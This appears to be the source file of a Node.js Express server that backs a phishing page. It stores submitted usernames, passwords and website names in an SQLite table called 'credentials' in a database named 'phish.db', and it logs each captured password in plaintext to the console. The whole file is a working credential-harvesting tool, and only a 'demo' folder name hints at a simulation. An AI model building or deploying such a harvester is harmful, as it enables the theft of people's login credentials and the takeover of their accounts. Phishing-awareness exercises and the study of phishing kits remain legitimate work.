const express = require('express');
const multer = require('multer');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const morgan = require('morgan');

// Initialize app
const app = express();
const PORT = process.env.PORT || 3001;

// Log to console
app.use(morgan('combined'));

// Database path
const dbPath = process.env.DB || '/var/db/demo/phish.db';

// Ensure database directory exists
if (!fs.existsSync(path.dirname(dbPath))) {
    fs.mkdirSync(path.dirname(dbPath), { recursive: true });
}

// Initialize and create the database and table if they don't exist
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('Error opening database:', err.message);
    } else {
        console.log('Connected to SQLite database.');
        db.run(
            `CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                website TEXT NOT NULL,
                date TEXT NOT NULL
            )`,
            (err) => {
                if (err) {
                    console.error('Error creating table:', err.message);
                } else {
                    console.log('Table "credentials" is ready.');
                }
            }
        );
    }
});

// Set up multer to handle form-data
const upload = multer();

// Middleware
app.use(express.static(path.join(__dirname, 'public')));

// Route: Serve HTML form
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// Route: Handle form submission
app.post('/submit', upload.none(), (req, res) => {
    console.log('Request Body:', req); // Log parsed form data

    const { username, password, website, date } = req.body;

    console.log(`Username: ${username}, Password: ${password}, Website: ${website}, Date: ${date}`);

    // Store data in SQLite database
    db.run(
        `INSERT INTO credentials (username, password, website, date) VALUES (?, ?, ?, ?)`,
        [username, password, website, date],
        function (err) {
            if (err) {
                console.error('Error inserting data:', err.message);
                return res.status(500).send('Internal Server Error');
            }
            console.log(`Data inserted with ID: ${this.lastID}`);
            res.redirect('/');
        }
    );
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});